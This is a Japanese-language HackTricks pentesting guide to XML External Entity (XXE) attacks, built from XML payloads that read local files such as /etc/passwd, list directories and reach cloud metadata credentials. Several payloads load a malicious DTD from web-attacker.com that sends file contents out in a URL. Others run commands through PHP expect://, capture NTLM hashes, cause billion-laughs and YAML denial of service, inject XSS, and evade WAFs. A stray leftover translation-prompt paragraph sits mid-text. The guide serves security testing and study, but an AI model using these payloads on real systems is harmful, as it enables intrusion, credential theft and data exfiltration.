# XXE - XEE - XML External Entity

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

XML External Entity攻撃は、XML入力を解析するアプリケーションに対する攻撃の一種です。

## XMLの基礎

**この部分のほとんどは、この素晴らしいPortswiggerのページから取られています:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### XMLとは何か？ <a href="#what-is-xml" id="what-is-xml"></a>

XMLは"extensible markup language"の略です。XMLはデータの保存と輸送のために設計された言語です。HTMLと同様に、XMLはタグとデータのツリー構造を使用します。HTMLと異なり、XMLは事前定義されたタグを使用せず、データを記述する名前をタグに付けることができます。ウェブの歴史の初期には、XMLはデータ輸送フォーマットとして流行していました（"AJAX"の"X"は"XML"を表します）。しかし、現在はJSONフォーマットに人気が移っています。

### XMLエンティティとは何か？ <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XMLエンティティは、データ自体を使用する代わりに、XMLドキュメント内のデータ項目を表す方法です。XML言語の仕様にはさまざまなエンティティが組み込まれています。例えば、エンティティ`&lt;`と`&gt;`は文字`<`と`>`を表します。これらはXMLタグを示すメタ文字であり、データ内に現れる場合は通常、エンティティを使用して表される必要があります。

### XMLエレメントとは何か？

エレメント型宣言は、XMLドキュメントに現れることができるエレメントの型と数、どのエレメントが互いに現れることができるか、どの順序で現れる必要があるかのルールを設定します。例えば：

* `<!ELEMENT stockCheck ANY>` は、任意のオブジェクトが親`<stockCheck></stockCheck>`内に存在できることを意味します
* \<!ELEMENT stockCheck EMPTY> は、それが空であるべきことを意味します `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> は、`<stockCheck>`が子供として`<productId>`と`<storeId>`を持つことができると宣言します

### ドキュメントタイプ定義とは何か？ <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

XMLドキュメントタイプ定義（DTD）には、XMLドキュメントの構造、含むことができるデータ値の型、その他の項目を定義する宣言が含まれています。DTDは、XMLドキュメントの開始時にオプションの`DOCTYPE`エレメント内で宣言されます。DTDは、ドキュメント自体内に完全に自己完結している（「内部DTD」と呼ばれる）か、他の場所からロードされる（「外部DTD」と呼ばれる）か、またはその両方のハイブリッドであることができます。

### XMLカスタムエンティティとは何か？ <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XMLでは、DTD内でカスタムエンティティを定義することができます。例えば：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

この定義は、エンティティ参照`&myentity;`の任意の使用がXMLドキュメント内で定義された値"`my entity value`"に置き換えられることを意味します。

### XML外部エンティティとは何か？ <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML外部エンティティは、定義が宣言されているDTDの外部に位置するカスタムエンティティの一種です。

外部エンティティの宣言には`SYSTEM`キーワードが使用され、エンティティの値をロードするためのURLを指定する必要があります。例えば：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

URLは`file://`プロトコルを使用することができ、したがって外部エンティティはファイルからロードすることができます。例えば：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML外部エンティティは、[XML外部エンティティ攻撃](https://portswigger.net/web-security/xxe)が発生する主要な手段を提供します。

### XMLパラメータエンティティとは何か？

時には、アプリケーションによる入力検証や使用されているXMLパーサーの強化により、通常のエンティティを使用したXXE攻撃がブロックされます。この状況では、XMLパラメータエンティティを代わりに使用することができるかもしれません。XMLパラメータエンティティは、DTD内の他の場所でのみ参照できる特別な種類のXMLエンティティです。現在の目的のために、2つのことだけを知っておく必要があります。まず、XMLパラメータエンティティの宣言には、エンティティ名の前にパーセント文字が含まれます：

`<!ENTITY % myparameterentity "my parameter entity value" >`

そして二つ目に、パラメータエンティティは通常のアンパサンドの代わりにパーセント文字を使用して参照されます：%myparameterentity;`

これは、以下のようにXMLパラメータエンティティを介してブラインドXXEをアウトオブバンド検出でテストすることができることを意味します：

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

このXXEペイロードは`xxe`というXMLパラメータエンティティを宣言し、そのエンティティをDTD内で使用します。これにより、攻撃者のドメインへのDNSルックアップとHTTPリクエストが発生し、攻撃が成功したことが確認されます。

## 主な攻撃

[これらの攻撃のほとんどは、素晴らしいPortswiggersのXEEラボを使用してテストされました: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### 新しいエンティティテスト

この攻撃では、単純な新しいENTITY宣言が機能しているかをテストします
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### ファイルの読み取り

異なる方法で `/etc/passwd` を読み取ってみましょう。Windows の場合は、`C:\windows\system32\drivers\etc\hosts` を読み取ってみることができます。

この最初のケースでは、SYSTEM "_**file:///**etc/passwd_" も機能することに注意してください。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

この2番目のケースは、WebサーバーがPHPを使用している場合（Portswiggersのラボではない場合）にファイルを抽出するのに役立つはずです。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
この第3のケースでは、`Element stockCheck` を ANY として宣言していることに注意してください。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### ディレクトリリスティング

**Java** ベースのアプリケーションでは、XXE を使用して以下のようなペイロードで**ディレクトリの内容をリストする**ことが可能かもしれません（ファイルの代わりにディレクトリを要求するだけです）：
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXEを利用してクラウド内のSSRFを悪用することができます
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

**以前にコメントした技術**を使用して、サーバーが脆弱であることを示すために、制御しているサーバーにアクセスさせることができます。しかし、それが機能していない場合は、**XMLエンティティが許可されていない**可能性があります。その場合、**XMLパラメータエンティティ**を使用してみることができます：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - データをアウトオブバンドで抽出

**今回は、サーバーに新しいDTDを読み込ませ、その内容をHTTPリクエストを通じて送信する悪意のあるペイロードを作成します（複数行のファイルの場合、** _**ftp://**_ **を介して抽出しようと試みることができます）。この説明は** [**Portswiggerのラボからのものです**](https://portswigger.net/web-security/xxe/blind)**。**

`/etc/hostname` ファイルの内容を抽出するための悪意のあるDTDの例は以下の通りです：
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
このDTDは以下のステップを実行します：

* `/etc/passwd` ファイルの内容を含む `file` というXMLパラメータエンティティを定義します。
* `exfiltrate` という別のXMLパラメータエンティティの動的宣言を含む `eval` というXMLパラメータエンティティを定義します。`exfiltrate` エンティティは、URLクエリストリング内の `file` エンティティの値を含むHTTPリクエストを攻撃者のウェブサーバーに送信することで評価されます。
* `eval` エンティティを使用し、`exfiltrate` エンティティの動的宣言が実行されるようにします。
* `exfiltrate` エンティティを使用すると、指定されたURLへのリクエストによってその値が評価されます。

攻撃者は、通常、自分のウェブサーバーにロードすることで、制御下にあるシステム上で悪意のあるDTDをホストする必要があります。例えば、攻撃者は以下のURLで悪意のあるDTDを提供するかもしれません：\
`http://web-attacker.com/malicious.dtd`

最後に、攻撃者は脆弱なアプリケーションに以下のXXEペイロードを送信する必要があります：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
このXXEペイロードは`xxe`というXMLパラメータエンティティを宣言し、そのエンティティをDTD内で使用します。これにより、XMLパーサーは攻撃者のサーバーから外部DTDを取得し、インラインで解釈します。悪意のあるDTD内で定義された手順が実行され、`/etc/passwd`ファイルが攻撃者のサーバーに送信されます。

### エラーベース(外部DTD)

**このケースでは、サーバーに悪意のあるDTDを読み込ませ、エラーメッセージ内にファイルの内容を表示させます（エラーメッセージを見ることができる場合にのみ有効です）。** [**こちらの例。**](https://portswigger.net/web-security/xxe/blind)

以下のように悪意のある外部DTDを使用して、`/etc/passwd`ファイルの内容を含むXMLパースエラーメッセージをトリガーできます：
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
このDTDは以下のステップを実行します：

* `/etc/passwd` ファイルの内容を含む `file` というXMLパラメータエンティティを定義します。
* `error` という別のXMLパラメータエンティティの動的宣言を含む `eval` というXMLパラメータエンティティを定義します。`error` エンティティは、`file` エンティティの値を含む存在しないファイルをロードすることによって評価されます。
* `eval` エンティティを使用し、`error` エンティティの動的宣言を実行させます。
* `error` エンティティを使用することで、存在しないファイルをロードしようとしてその値が評価され、存在しないファイルの名前を含むエラーメッセージが生成されます。このファイルの名前は `/etc/passwd` ファイルの内容です。

外部DTDエラーを以下で呼び出します：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
以下は、サーバーの応答のエラーメッセージの中にファイルの内容が表示されるはずです。

![](<../.gitbook/assets/image (223) (1).png>)

_**外部DTDを使用すると、一つのエンティティを二つ目のエンティティ（`eval`）の中に含めることができますが、内部DTDではこれが禁止されています。そのため、通常は外部DTDを使用しないとエラーを強制することはできません。**_

### **エラーベース（システムDTD）**

では、**アウトオブバンドの相互作用がブロックされている**（外部接続が利用できない）場合のブラインドXXEの脆弱性はどうでしょうか？[こちらからの情報](https://portswigger.net/web-security/xxe/blind)。

この状況では、XML言語仕様の抜け穴を利用して、**機密データを含むエラーメッセージをトリガーする**ことがまだ可能かもしれません。ドキュメントの**DTDが内部と外部のDTD宣言のハイブリッドを使用している場合**、**内部DTDは外部DTDで宣言されているエンティティを再定義することができます**。この場合、別のパラメータエンティティの定義内でXMLパラメータエンティティを使用するという制限が緩和されます。

つまり、攻撃者は、使用しているXMLパラメータエンティティが**外部DTD内で宣言されているエンティティを再定義している場合**、内部DTD内から**エラーベースのXXE技術を使用することができます**。もちろん、アウトオブバンド接続がブロックされている場合、外部DTDはリモートの場所からロードすることはできません。代わりに、アプリケーションサーバーにローカルな**外部DTDファイルである必要があります**。_基本的に、攻撃はローカルファイルシステム上に存在するDTDファイルを呼び出し、既存のエンティティを機密データを含むパースエラーをトリガーするように再定義することを目的としています。_

例えば、サーバーファイルシステム上の`/usr/local/app/schema.dtd`という場所にDTDファイルがあり、このDTDファイルが`custom_entity`というエンティティを定義しているとします。攻撃者は、以下のようなハイブリッドDTDを送信することで、`/etc/passwd`ファイルの内容を含むXMLパースエラーメッセージをトリガーすることができます：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
このDTDは以下のステップを実行します：

* サーバーファイルシステム上に存在する外部DTDファイルの内容を含む、`local_dtd`と呼ばれるXMLパラメータエンティティを定義します。
* 外部DTDファイルで既に定義されている`custom_entity`と呼ばれるXMLパラメータエンティティを再定義します。このエンティティは、`/etc/passwd`ファイルの内容を含むエラーメッセージをトリガーするために、既に説明された[エラーベースのXXEエクスプロイト](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)として再定義されます。
*   `local_dtd`エンティティを使用することで、外部DTDが解釈され、`custom_entity`エンティティの再定義された値を含むようになります。これにより、望ましいエラーメッセージが結果として得られます。

**実際の例：** GNOMEデスクトップ環境を使用しているシステムは、`ISOamso`と呼ばれるエンティティを含むDTDが`/usr/share/yelp/dtd/docbookx.dtd`によくあります。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

この技術は**内部DTDを使用するため、まず有効なDTDを見つける必要があります**。これを行うには、サーバーが使用しているのと同じ**OS / ソフトウェア**を**インストールして**、いくつかの**デフォルトDTDを探す**か、システム内の**デフォルトDTDのリストを取得して**、それらのいずれかが存在するか**確認**します。
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### システム内のDTDの検出

以下の素晴らしいgithubリポジトリでは、**システム内に存在する可能性のあるDTDのパス**を見つけることができます：

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

さらに、**被害者システムのDockerイメージ**を持っている場合、同じリポジトリのツールを使用して**イメージをスキャン**し、システム内に存在する**DTDのパス**を**見つける**ことができます。方法を学ぶには、[githubのReadme](https://github.com/GoSecure/dtd-finder)を読んでください。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXEを介したOffice Open XMLパーサー

（[**こちら**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/)からコピー）\
多くのウェブアプリケーションでは、Microsoft Officeドキュメントのアップロードを許可し、その中からいくつかの詳細を解析します。例えば、XLSX形式のスプレッドシートをアップロードすることでデータをインポートできるウェブアプリケーションがあるかもしれません。データをスプレッドシートから抽出するためには、パーサーは**少なくとも1つのXMLファイルを解析する必要があります**。

これをテストする唯一の方法は、**XXEペイロードを含むMicrosoft Officeファイルを生成する**ことです。まず、ドキュメントを解凍するための空のディレクトリを作成し、解凍しましょう！
```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
inflating: ./unzipped/word/numbering.xml
inflating: ./unzipped/word/settings.xml
inflating: ./unzipped/word/fontTable.xml
inflating: ./unzipped/word/styles.xml
inflating: ./unzipped/word/document.xml
inflating: ./unzipped/word/_rels/document.xml.rels
inflating: ./unzipped/_rels/.rels
inflating: ./unzipped/word/theme/theme1.xml
inflating: ./unzipped/[Content_Types].xml
```
```markdown
お気に入りのテキストエディタ（vim）で `./unzipped/word/document.xml` を開き、**お気に入りのXXEペイロードを含むようにXMLを編集します**。最初に試すことは通常HTTPリクエストで、以下のようになります：
```
```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```
これらの行は、2つのルートXMLオブジェクトの間に挿入する必要があります。このように、もちろん、リクエストを監視できるURLにURLを置き換える必要があります。

![これらの行は、2つのルートXMLオブジェクトの間に挿入する必要があります。このように](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

残る作業は、**ファイルをzip圧縮して、悪意のあるpoc.docxファイルを作成することです**。先に作成した「unzipped」ディレクトリから、以下を実行します。

![先に作成した「unzipped」ディレクトリから、以下を実行します。](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

これで、ファイルを（願わくば）脆弱なWebアプリケーションにアップロードし、Burp Collaboratorのログでリクエストがあることをハッキングの神に祈ります。

### Jar: プロトコル

`jar` プロトコルは、**Javaアプリケーション**でのみ利用可能です。これは、**PKZIP**ファイル（`.zip`、`.jar`、...）内のファイルにアクセスすることを可能にし、ローカルファイルとリモートファイルの両方で機能します。
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIPファイル内のファイルにアクセスできることは、**システムDTDファイルを介してXXEを悪用するために非常に便利です。** [このセクションをチェックしてシステムDTDファイルの悪用方法を学びましょう](xxe-xee-xml-external-entity.md#error-based-system-dtd)。
{% endhint %}

#### 舞台裏

1. zipアーカイブをロードするためにHTTPリクエストを行います。 `https://download.host.com/myarchive.zip`
2. HTTPレスポンスを一時的な場所に保存します。 `/tmp/...`
3. アーカイブを抽出します。
4. `file.zip`を読み取ります。
5. 一時ファイルを削除します。

流れを2番目のステップで止めることが可能です。トリックは、ファイルを提供する際に接続を決して閉じないことです。[このツールが役立つかもしれません](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：pythonで`slow_http_server.py`とjavaで`slowserver.jar`。

サーバーがファイルをダウンロードしたら、tempディレクトリをブラウズしてその場所を見つける必要があります。ランダムであるため、ファイルパスは事前に予測できません。

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
一時ディレクトリにファイルを書き込むことは、**パストラバーサルに関連する別の脆弱性をエスカレートするのに役立つ**ことがあります（ローカルファイルインクルード、テンプレートインジェクション、XSLT RCE、デシリアライゼーションなど）。
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### ビリオン・ラフ・アタック
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml 攻撃
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratic Blowup Attack

![](<../.gitbook/assets/image (531).png>)

#### NTMLハッシュの取得

Windowsホストでは、responder.pyハンドラを設定することで、WebサーバーユーザーのNTMLハッシュを取得することが可能です。
```
Responder.py -I eth0 -v
```
送信することで
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
次に、hashcatを使用してハッシュをクラックしてみることができます。

## 隠されたXXEの発生源

### XInclude

[こちらから。](https://portswigger.net/web-security/xxe)

一部のアプリケーションは**クライアントから提出されたデータを受け取り、サーバー側でXMLドキュメントに埋め込んでから、そのドキュメントを解析します**。この例は、クライアントから提出されたデータが**バックエンドのSOAPリクエスト**に配置され、その後バックエンドのSOAPサービスによって処理される場合に発生します。

この状況では、**XMLドキュメント全体を制御していないため**、`DOCTYPE`要素を定義または変更することができず、従来のXXE攻撃を実行することはできません。しかし、代わりに`XInclude`を使用することができるかもしれません。`XInclude`はXML仕様の一部であり、XMLドキュメントをサブドキュメントから構築することを可能にします。XMLドキュメント内の任意のデータ値に`XInclude`攻撃を配置できるため、サーバー側のXMLドキュメントに配置される単一のデータ項目のみを制御している状況でも攻撃を実行できます。

`XInclude`攻撃を実行するには、`XInclude`名前空間を参照し、含めたいファイルへのパスを提供する必要があります。例えば：
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - ファイルアップロード

[こちらから。](https://portswigger.net/web-security/xxe)

一部のアプリケーションでは、ユーザーがアップロードしたファイルをサーバー側で処理することができます。一般的なファイル形式の中には、XMLを使用するものや、XMLのサブコンポーネントを含むものがあります。XMLベースの形式の例には、DOCXのようなオフィス文書形式や、SVGのような画像形式があります。

例えば、アプリケーションがユーザーに**画像のアップロード**を許可し、アップロード後にサーバーでこれらを処理または検証することがあります。アプリケーションがPNGやJPEGのような形式を受け取ることを期待していても、使用されている**画像処理ライブラリがSVG画像をサポートしている**可能性があります。SVG形式はXMLを使用しているため、攻撃者は悪意のあるSVG画像を提出し、XXE脆弱性のための隠された攻撃面に到達することができます。
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
**コマンドを実行**するためにPHPの"expect"ラッパーを使用することもできます：
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
**注：読み取ったファイルの最初の行または実行結果は、作成された画像の中に表示されます。そのため、SVGが作成した画像にアクセスできる必要があります。**

### **PDF - ファイルアップロード**

PDFファイルをアップロードしてXXEを悪用する方法については、以下の投稿を読んでください：

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencodedからXMLへ

POSTリクエストがXML形式のデータを受け入れる場合、そのリクエストでXXEを悪用できる可能性があります。例えば、通常のリクエストに以下の内容が含まれている場合：
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
その場合、以下のリクエストを送信して、同じ結果を得ることができるかもしれません：
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSONからXEEへの変換

リクエストを変更するには、“**Content Type Converter**”というBurp拡張機能を使用できます。[こちら](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)でこの例を見ることができます：
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
以下は、ハッキング技術に関する本の内容です。ファイル `pentesting-web/xxe-xee-xml-external-entity.md` からの関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、単語 'leak'、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。

---

もう一つの例は[こちら](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)で見つけることができます。

## WAF & Protections Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
この方法は、XMLサーバーが `data://` プロトコルを受け入れる場合にのみ機能します。

### UTF-7

ここで \[**"Encode Recipe**" of cyberchef ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) を使用してUTF-7に変換できます。
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ プロトコルのバイパス

ウェブがPHPを使用している場合、`file:/` の代わりに **phpラッパー** `php://filter/convert.base64-encode/resource=` を使用して**内部ファイルにアクセス**できます。

ウェブがJavaを使用している場合は、[**jar: プロトコル**](xxe-xee-xml-external-entity.md#jar-protocol)を確認してください。

### HTML エンティティ

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)からのトリック\
**htmlエンティティ**を使用して**エンティティ内にエンティティ**を作成し、それを呼び出して**dtdをロード**します。\
使用する**HTMLエンティティ**は**数値**である必要があります（[この例のように](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric%20entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)）。
```markup
